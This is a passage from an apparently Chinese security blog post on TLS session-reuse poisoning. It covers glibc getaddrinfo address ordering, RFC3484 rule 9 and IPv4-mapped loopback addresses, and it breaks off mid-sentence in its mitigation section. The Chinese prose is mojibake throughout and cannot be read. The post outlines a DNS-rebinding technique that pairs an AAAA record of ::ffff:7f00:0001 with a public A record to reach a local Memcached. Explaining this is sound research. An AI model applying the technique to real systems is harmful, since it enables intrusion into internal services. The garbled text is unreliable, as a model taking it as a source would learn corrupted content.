æ’åºæœ‰è¶£çš„å†å²ï¼Œä»¥ä¸‹æ˜¯ä¸ªäººå¯¹å…¶æŠ½å–çš„ç†è§£ï¼ŒåŸæ–‡è§ï¼š<a href="https://lists.debian.org/debian-glibc/2007/09/msg00347.html" target="_blank" rel="noopener">glibcâ€™s getaddrinfo() sort order</a></p><p>åœ¨è¿‡å»ï¼Œä¸»æœºååˆ° IP åœ°å€çš„æŸ¥è¯¢åˆ°ä¸€èˆ¬éƒ½æ˜¯ç”¨<code>gethostbyname</code>æ¥å®Œæˆçš„ï¼Œ<code>gethostbyname</code>çš„åœ°å€æ˜¯æŒ‰ç…§æœåŠ¡å™¨è¿”å›çš„åœ°å€é¡ºåºæ’åˆ—çš„ï¼ˆé™¤éåœ¨æœ¬åœ°åšäº†ç‰¹æ®Šçš„é…ç½®ï¼‰ã€‚å½“ä¸€ä¸ªæŸ¥è¯¢æœ‰å¤šä¸ªåœ°å€æ—¶ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰ NS æœåŠ¡å™¨éƒ½ä¼šå®‰æ’å¯¹è¿”å›çš„åœ°å€è¿›è¡Œâ€è½®æµ â€œæˆ– â€œå¾ªç¯â€ï¼šæ¯ä¸ªæŸ¥è¯¢éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„æ’åºã€‚è¿™æ˜¯ä¸ºäº†è®©ä¸€ä¸ªæœåŠ¡åå¯ä»¥å¼•ç”¨å¤šä¸ªç‰©ç†ç½‘ç»œæ¥å£ï¼ˆæˆ–è®¸åœ¨ä¸åŒçš„ä¸»æœºä¸Šï¼‰ï¼Œå¹¶åœ¨è¿™äº›æ¥å£ä¸Šåˆ†æ‹…è´Ÿè½½ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ â€œåŸºäºDNSçš„è´Ÿè½½å‡è¡¡â€ã€‚å¦‚æœåè®®æ˜¯åƒé‚®ä»¶è¿™æ ·çš„åè®®ï¼Œå¦‚æœç¬¬ä¸€ä¸ªåœ°å€ä¸æˆåŠŸï¼Œå‘é€è€…å¯èƒ½ä¼šå°è¯•å¤šä¸ªåœ°å€ï¼Œè¿™ä¹Ÿç»™äº†ä½ ä¸€ä¸ªæ•…éšœè½¬ç§»(failover)ã€‚</p><p> gethostbyname ç†è®ºä¸Šå¯ä»¥æ”¯æŒ IPv6 ï¼Œä½†æ¯æ¬¡è°ƒç”¨åªèƒ½è¿”å›ä¸€ç§åœ°å€ç±»å‹ã€‚è™½ç„¶æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å°† IPv4 åœ°å€åµŒå…¥åˆ° IPv6 åœ°å€ä¸­ï¼Œä½†å¯¹äºè¿™æ ·çš„æƒ…å†µï¼Œæ²¡æœ‰æ˜ç¡®çš„æ–¹æ³•å‘Šè¯‰ gethostbyname ï¼Œè°ƒç”¨çš„åº”ç”¨ç¨‹åºï¼ˆä»¥åŠåº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„å…¶ä»–å †æ ˆï¼‰å°†åº”å¯¹å¾—åˆ°ä¸€å † AF_INET6 è€Œä¸æ˜¯ AF_INET çš„è¿”å›ã€‚å› æ­¤å¯¹äº IPv6 ï¼Œéœ€è¦ä¸€ä¸ªæ–°çš„æ¥å£ã€‚è¿™ä¸ªæ¥å£ï¼ˆåœ¨ RFC3493 s6.1å’Œå®ƒçš„å‰èº«ä¸­å®šä¹‰ï¼‰å°±æ˜¯ getaddrinfo ã€‚</p><p>å®ƒæœ‰å‡ ä¸ªæ–°ç‰¹æ€§ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†ä¸è¿™é‡Œæ— å…³ã€‚å…³é”®çš„æ–°åŠŸèƒ½æ˜¯ï¼šgetaddrinfo å…è®¸åº”ç”¨ç¨‹åºæŒ‡å®šå®ƒæ˜¯å¦åªæƒ³è·å¾— IPv4 åœ°å€ï¼Œè¿˜æ˜¯ä¹Ÿæƒ³è·å¾— IPv6 åœ°å€ï¼Œå¦‚æœè·å¾—æ··åˆçš„åœ°å€ï¼Œé‚£ä¹ˆæ˜¯å°†å…¶ç¼–ç ä¸º AF_INET ï¼Œè¿˜æ˜¯å°†å…¶ç¼–ç ä¸º â€œv6-mapped â€œAF_INET6ï¼ˆè¿™é‡Œå°±æ˜¯ IPv4-mapped IPv6 Addresses ï¼‰ã€‚ç»“åˆå…¶ä»–å„ç§æ–°çš„ç‰¹ç‚¹ï¼Œè¿™ä½¿å¾—å°†ä¸€ä¸ªä»…æœ‰ IPv4 çš„åº”ç”¨ç¨‹åºè½¬æ¢ä¸º IPv6 åŠŸèƒ½å˜å¾—ç›¸å½“ç®€å•ã€‚æ‰€ä»¥ï¼Œæ€»çš„æ¥è¯´ï¼šgetaddrinfo æ˜¯ç”¨æ¥å–ä»£ gethostbyname çš„ã€‚</p><p>ç„¶è€Œï¼Œå¦å¤–ï¼Œäººä»¬æ„è¯†åˆ°ï¼Œå¦‚æœ getaddrinfo å¯ä»¥è¿”å› IPv4 å’Œ v6 åœ°å€çš„æ··åˆç‰©ï¼Œé‚£ä¹ˆæœ‰å¿…è¦æŒ‡å®šå®ƒä»¬çš„è¿”å›é¡ºåºã€‚å½“ RFC3484 ç¼–å†™æ—¶ï¼Œä½œè€…æ˜¾ç„¶è®¤ä¸ºæœ€å¥½çš„æ–¹æ³•æ˜¯åœ¨æ‰€æœ‰åœ°å€ä¸Šå®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œå®ƒå°†å®šä¹‰å“ªä¸ªåœ°å€æ˜¯é¦–é€‰ã€‚ RFC3484 çš„ä½œè€…ä¸ç®¡ä¸Šé¢æ‰€æè¿°çš„å¯¹ DNS å¾ªç¯åŠŸèƒ½çš„å½±å“ï¼ŒæŒ‡å®šï¼ˆç¬¬6æ¡è§„åˆ™9ï¼‰æ‰€æœ‰åœ°å€åº”è¯¥æŒ‰ç…§ä¸åšå‡ºé€‰æ‹©çš„ä¸»æœºçš„ â€œæ¥è¿‘åº¦ â€œè¿›è¡Œæ’åºâ€“å…¶ä¸­ â€œæ¥è¿‘åº¦ â€œè¢«å®šä¹‰ä¸ºæ™®é€šåˆå§‹åœ°å€å‰ç¼€çš„é•¿åº¦ã€‚</p><p>è¿™åœ¨ 3484 åˆ¶å®šä¹‹æ—¶ï¼Œå¯¹äº IPv6 çš„çœŸå®ç½‘ç»œè¿‘ä¼¼æ€§å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰äº‰è®®çš„å®šä¹‰ï¼Œä½†ç°åœ¨å¾ˆæ˜æ˜¾ï¼Œåœ¨çœŸå®çš„IPv6äº’è”ç½‘ä¸­ï¼Œå®ƒä¸æ˜¯è¿™æ ·çš„è¡¡é‡æ ‡å‡†ï¼Œåœ¨IPv4äº’è”ç½‘ä¸­ä¹Ÿä»æ¥æ²¡æœ‰è¿™æ ·çš„è¡¡é‡æ ‡å‡†ã€‚æ‰€ä»¥ RFC3484 s6 è§„åˆ™ 9 å°±æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºå®ƒèƒŒåçš„åŸå› å³ä½¿æ›¾ç»é€‚ç”¨ç°åœ¨ä¹Ÿä¸å†é€‚ç”¨äº†ã€‚ç„¶è€Œï¼Œæ¯”è¿™æ›´ç³Ÿç³•çš„æ˜¯ï¼šè§„åˆ™ 9ã€‚è¯•å›¾æ”¹å˜ç°æœ‰ç³»ç»Ÿçš„è¡Œä¸ºã€‚å¦‚æœæˆ‘ä»¬åŒæ„è§„åˆ™ 9ï¼Œé‚£ä¹ˆå®ƒä¹Ÿåº”è¯¥åŒæ ·é€‚ç”¨äºä½¿ç”¨ gethostbynameã€‚çš„åº”ç”¨ç¨‹åºã€‚æ‰€æœ‰ä½¿ç”¨ gethostbyname çš„ç°æœ‰åº”ç”¨ç¨‹åºéƒ½ä¸ç¬¦åˆè§„åˆ™9ã€‚ä¹Ÿè®¸å¯ä»¥ä¿®æ”¹ gethostbynameï¼Œä½¿å…¶æ ¹æ® RFC3484 s5 å’Œ s6 å¯¹åœ°å€è¿›è¡Œæ’åºã€‚ä½†è¿™æ˜¯ä¸€ä¸ªå¥½ä¸»æ„å—ï¼Ÿä¸ï¼Œæ˜¾ç„¶ä¸æ˜¯ã€‚è¿™å°†æ”¹å˜æ‰€æœ‰ç›®å‰ä½¿ç”¨ gethostbyname çš„åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚ç›®å‰ï¼Œè¿™äº›åº”ç”¨ç¨‹åº â€œéšæœº â€œåœ°é€‰æ‹©åœ°å€ï¼ˆæ ¹æ® DNS å¾ªç¯ï¼‰ã€‚è§„åˆ™ 9 ä¼šè®©åº”ç”¨ç¨‹åºæ ¹æ®æœ€é•¿é€šç”¨å‰ç¼€æ¥é€‰æ‹©åœ°å€ï¼Œè¿™å°†ç ´ååŸºäº DNS çš„è´Ÿè½½å‡è¡¡æœºåˆ¶ã€‚é‚£ä¹ˆ getaddrinfo å‘¢ï¼Ÿ æˆ‘ä»¬æ²¡æœ‰ç†ç”±ä¸ºäº†å¢åŠ æ–°åŠŸèƒ½å½»åº•åœ°æ”¹å˜è¯¥ API ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œæˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨çš„ DNS è´Ÿè½½å‡è¡¡å·²ç»è¢«è¿™ä¸ªå˜åŒ–æ‰“ç ´äº†! ä¹Ÿå°±æ˜¯è¯´ï¼Œåº”ç”¨ç¨‹åºä»ä½¿ç”¨éè§„åˆ™ 9 çš„ gethostbyname æ”¹ä¸ºè§„åˆ™ 9 çš„ getaddrinfo ï¼ŒæœåŠ¡å™¨ä¼šå‡ºç°æ¯”è¾ƒä¸¥é‡çš„éè´Ÿè½½å‡è¡¡ã€‚</p><p>RFC è¯•å›¾è§„å®šä»¥å¯é¢„æµ‹çš„é¡ºåºè¿”å›åœ°å€æ˜¯ä¸åˆç†çš„ï¼Œå› ä¸ºå‡ åå¹´æ¥æ•´ä¸ªäº’è”ç½‘æ‰€ä¾èµ–çš„æ—¢å®šè¡Œä¸ºæ˜¯åœ°å€ä¸æ˜¯ä»¥å¯é¢„æµ‹çš„é¡ºåºè¿”å›çš„ï¼Œå¹¶ä¸”è¿™é‡Œçš„ä¸å¯é¢„æµ‹æ€§ä¸æ˜¯å¶ç„¶çš„ã€‚åœ¨ DNS è½®è¯¢å‡ºç°ä¹‹å‰ï¼Œåœ°å€æ€»æ˜¯æŒ‰ç…§ DNS åŒºåŸŸç®¡ç†å‘˜æŒ‡å®šçš„é¡ºåºè¿”å›ï¼Œç‰¹æ®Šçš„ä»£ç è¢«æ·»åŠ åˆ° namervers ä¸­ (å‡ åå¹´å‰)ï¼Œä»¥ â€œéšæœºåŒ– â€œè¿™ä¸ªé¡ºåºã€‚ getaddrinfo ä¸åº”è¯¥å–æ¶ˆè¿™ä¸ªæªæ–½ã€‚æ­£å¦‚ä¸Šé¢æ‰€å±•ç¤ºçš„ï¼ŒRFCæ˜¯é”™è¯¯çš„ï¼Œä¸ç°æœ‰çš„å®è·µä¸ä¸€è‡´ï¼Œè€Œä¸”æ‰€æå‡ºçš„éµå®ˆå®ƒçš„æ–¹å¼å¯¼è‡´æˆ‘ä»¬æœ‰ä¸¤ä¸ªç±»ä¼¼çš„æ¥å£ï¼ˆ gethostbyname å’Œ getaddrinfo ï¼‰ï¼Œå®ƒä»¬çš„è¡Œä¸ºä¸ä¸€è‡´ï¼Œå®šä¹‰ getaddrinfo çš„æ–‡æ¡£æ˜¯ RFC 3493ï¼Œè€Œ RFC 3493 æ²¡æœ‰å‚è€ƒ RFC 3484 ï¼Œå®ƒæ ¹æœ¬æ²¡æœ‰æåˆ°æ’åºã€‚è¯·æ³¨æ„ï¼ŒRFC3484 ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†ã€‚å®ƒæ˜¯ä¸€ä¸ª â€œproposed standardâ€â€“æœ€æ—©çš„ IETF æ ‡å‡†è·Ÿè¸ªæ–‡ä»¶çŠ¶æ€çš„ä¸œè¥¿ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬åº”è¯¥å»ºè®® RFC3484 è§„åˆ™ 9 åº”è¢«åºŸå¼ƒï¼Œå¹¶åº”è¢«åºŸé™¤ï¼ˆIPv4 åº”è¯¥è¦åºŸé™¤è¿™ä¸ªè§„åˆ™ï¼ŒIPv6 å¯èƒ½ä¹Ÿéœ€è¦ï¼‰ã€‚</p><h2 id="Additional-Remarks"><a href="#Additional-Remarks" class="headerlink" title="Additional Remarks"></a>Additional Remarks</h2><h3 id="IPv4-Mapped-127-0-0-1"><a href="#IPv4-Mapped-127-0-0-1" class="headerlink" title="IPv4-Mapped 127.0.0.1"></a>IPv4-Mapped 127.0.0.1</h3><p>2021/05/14 æ›´æ–°ï¼š</p><p>å¯¹äº IPv4-mapped IPv6 è¿™ç±»åœ°å€ï¼Œæˆ‘è®¤ä¸ºå¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ v6 åœ°å€ï¼ŒçœŸæ­£ v6 çš„ loopback åœ°å€ä¸º ::1 ï¼ŒIPv4-mapped IPv6 åªæ˜¯ IPv4 åœ°å€å†™æˆ IPv6 å½¢å¼ã€‚é‚£ä¹ˆæ—¢ç„¶å¹¶ä¸æ˜¯çœŸæ­£çš„ IPv6 ï¼Œä½†æ˜¯å†™ä½œäº† IPv6 ï¼Œæˆ‘è§‰å¾—å¯¹äº<code>getaddrinfo</code>æ¥è¯´ï¼Œä»–ç¡®å®æ˜¯ IPv6 çš„ç»“æ„ï¼Œä½†æ˜¯å¯¹äº IPv6 æ¥è¯´ï¼ŒçœŸæ­£çš„å›ç¯åœ°å€å¹¶ä¸æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥ä»–å¯èƒ½è¢«è§†ä¸ºæ™®é€šçš„ IPv6 åœ°å€å¤„ç†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç®€å•éªŒè¯ä¸€ä¸‹è‡ªå·±çš„æƒ³æ³•ï¼šç›´æ¥åœ¨ä¸€ä¸ªåŸŸåä¸ŠåŒæ—¶è®¾ç½® AAAA è®°å½•ä¸º ::ffff:7f00:0001 ï¼ŒA è®°å½•ä¸ºéšæ„ä¸€ä¸ª IPv4 å…¬ç½‘åœ°å€ã€‚</p><p>ä½¿ç”¨ curl è¯·æ±‚æˆ‘ä»¬è®¾ç½®çš„åŸŸåï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/11.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸¤ä¸ªåœ°å€æ˜¯éšæœºè¿”å›çš„ã€‚</p><p>å¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥é‡æ–° debug ä¸€é getaddrinfo å‡½æ•°ï¼ŒéªŒè¯ä¸€ä¸‹è‡ªå·±çš„æƒ³æ³•ã€‚äºæ˜¯ï¼Œé‡æ–° debug äº†ä¸€é libc å½“ä¸­çš„ rfc3484_sort å‡½æ•°ï¼Œå¯¹äº ::ffff:7f00:0001 åœ°å€æ¥è¯´ï¼Œ getaddrinfo ä½¿ç”¨äº† IPv6 ç»“æ„ä½“å¤„ç†è¿™ä¸ªåœ°å€ï¼Œä½†æ˜¯æœ€åç»“æœæ˜¯æŒ‰ç…§ DNS å¾—åˆ°çš„åŸé¡ºåºè¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªåœ°å€ä¸ IPv4 vps åœ°å€ä¸€èµ·å‡ºç°æ—¶ï¼Œå¯¹äºgetaddrinfo æ¥è¯´æ˜¯éšæœºè¿”å›ã€‚æ‰€ä»¥ä»ç»“æœæ¥çœ‹ï¼Œä»–ç¡®å®è¢«è§†ä¸ºäº†è·Ÿ v4 vps ç›¸åŒä¼˜å…ˆçº§çš„åœ°å€ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å®é™…ä¸Šåº”ä¸åº”è¯¥è¿™ä¹ˆå¤„ç†å‘¢ï¼ŸæŒ‰ç…§ RFC 6742 çš„è¯´æ³•ï¼š</p><blockquote><p>â€‹    IPv4-compatible addresses [RFC4291], IPv4-mapped [RFC4291], IPv4-converted [RFC6145], IPv4-translatable [RFC6145], and 6to4 addresses [RFC3056] contain an embedded IPv4 address. For the purposes of this document, these addresses MUST be treated as having global scope.</p></blockquote><p>IPv4-mapped è¿™ç±»åœ°å€åº”è¯¥è¢«è§†ä¸ºæ‹¥æœ‰ global scope ï¼Œè€ŒçœŸæ­£æ„ä¹‰ä¸Šçš„å›ç¯åœ°å€åº”è¯¥æ˜¯è¢«ä½œä¸º link-local scope å¤„ç†çš„ï¼Œè¿™ä¹Ÿå°±åŸºæœ¬èƒ½è§£é‡Šä¸ºä»€ä¹ˆä»–ä¼šè¢«ä½œä¸ºä¸ v4 vps è¿™ç±»åœ°å€ä¸€æ ·çš„ä¼˜å…ˆçº§äº†ã€‚</p><p>æ‰€ä»¥ä¹‹å‰æ–‡ä¸­çš„è¯´æ³•ä¸åº”è¯¥æŠŠ ::ffff:7f00:0001 ä¸ 127.0.0.1 è§†ä¸ºåŒç±»åœ°å€ï¼Œè¿™ä¸€ç‚¹æ˜¯é”™è¯¯çš„ã€‚</p><h3 id="IPv4-Mapped-With-Memcached"><a href="#IPv4-Mapped-With-Memcached" class="headerlink" title="IPv4-Mapped With Memcached"></a>IPv4-Mapped With Memcached</h3><p>2021/05/14 æ›´æ–°ï¼š</p><p>æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ä½¿ç”¨ IPv4-Mapped è¿™ç±»åœ°å€è¿›è¡Œå®éªŒçœ‹çœ‹èƒ½ä¸èƒ½å†™å…¥ Memcachedï¼ŒåŒæ ·çš„ DNS é…ç½®ï¼šåœ¨ä¸€ä¸ªåŸŸåä¸ŠåŒæ—¶è®¾ç½® AAAA è®°å½•ä¸º ::ffff:7f00:0001 ï¼ŒA è®°å½•ä¸ºéšæ„ä¸€ä¸ª IPv4 å…¬ç½‘åœ°å€ã€‚</p><p>ç„¶åå…¶ä»–æ“ä½œåŸºæœ¬åŒåŒ A è®°å½•å®éªŒæ–¹å¼ä¸€è‡´ï¼Œä½¿ç”¨ proxy.py æ‹’ç»å®¢æˆ·ç«¯å¯¹ TLS æœåŠ¡ç«¯çš„ç¬¬äºŒæ¬¡è¯·æ±‚ä»¥è¾¾åˆ° DNS Rebinding çš„æ•ˆæœï¼Œäºæ˜¯å¾—åˆ°çš„å®éªŒç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/12.png" alt=""></p><p>è¯´æ˜ Memcached å¯ä»¥ä» IPv4-Mapped è¿™ç±»åœ°å€å†™å…¥ã€‚</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>çºµè§‚æ•´ä¸ªæ¼æ´ï¼Œæˆ‘è§‰å¾—å…¶å®é€ æˆè¿™ä¸ªæ¼æ´æ˜¯ç”±äºæ¯”è¾ƒå¤šå¤æ‚çš„å› ç´ å¯¼è‡´çš„ï¼Œä»åè®®è§’åº¦æ¥è¯´ï¼Œåœ¨ RFC å½“ä¸­ä¹Ÿå¹¶æ²¡æœ‰æåˆ° Client åˆ°åº•åº”è¯¥æ€ä¹ˆå­˜å‚¨ Server ç»™äºˆçš„ç›¸å…³å‡­è¯ï¼Œä¹Ÿå¹¶æ²¡æœ‰è¯´æ˜æ¸…æ¥šæ€ä¹ˆä¸å¯¹åº”çš„ TLS ä¼šè¯ç»‘å®šï¼Œæ‰€ä»¥å¯¼è‡´äº† Client åœ¨æ”¯æŒ TLS ä¼šè¯é‡ç”¨çš„äº§ç”Ÿäº†å„ç§å®ç°ï¼›è€Œä» Client å®¢æˆ·ç«¯æ¼æ´æ¥è¯´ï¼Œä¹Ÿæ˜¯å¼€å‘è€…ä»¬æ²¡æœ‰å¯¹è¿›è¡Œ TLS ä¼šè¯é‡ç”¨çš„åœ°å€è¿›è¡ŒäºŒæ¬¡æ ¡éªŒï¼Œå¯¼è‡´äº†å¯ä»¥ä½¿ç”¨ DNS Rebinding æ¥è½»æ¾ç»•è¿‡ã€‚</p><p>æ‰€ä»¥ï¼Œå¯¹äºè¯¥ç±»æ¼æ´é¦–è¦çš„é˜²æŠ¤æ‰‹æ®µå°±æ˜¯éœ€è¦ç¡®è®¤è¿›è¡Œ TLS ä¼šè¯é‡ç”¨çš„åœ°å€ä¸ä¹‹å‰çš„åœ°å€ä¸€è‡´ï¼Œè€Œè¿™ä¸ªå®ç°é€”å¾„æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œæ¯”å¦‚è¯´é˜²å¾¡ DNS Rebinding çš„æ–¹å¼èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£åˆ°æ•´ä¸ªæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å¯¹äº DNS Rebinding çš„ä¼ ç»Ÿé˜²å®ˆæ–¹å¼æœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šè¯´ Client åªåšä¸€æ¬¡ DNS è§£æï¼Œä¹‹åå°±ä¸€ç›´ä½¿ç”¨è¿™ä¸ª IP è§£æç»“æœï¼Œä½†æ˜¯å¦‚æœ Client å­˜åœ¨åƒæ–‡ä¸­é‚£æ 